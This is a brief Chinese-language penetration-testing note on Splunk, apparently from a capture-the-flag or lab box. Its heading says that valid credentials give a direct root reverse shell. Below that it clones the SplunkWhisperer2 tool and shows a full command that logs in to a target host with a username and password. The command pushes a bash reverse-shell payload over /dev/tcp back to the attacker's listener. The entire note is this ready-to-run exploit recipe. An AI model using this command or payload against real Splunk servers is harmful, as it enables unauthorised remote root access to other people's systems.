# splunk

‍

有凭据直接反弹root

```bash
git clone https://github.com/cnotin/SplunkWhisperer2.git

python3 PySplunkWhisperer2_remote.py --host 10.129.2.21 --lhost 10.10.14.29 --username shaun --password Guitar123 --payload "bash -c 'bash -i >& /dev/tcp/10.10.14.29/9999 0>&1'"
```
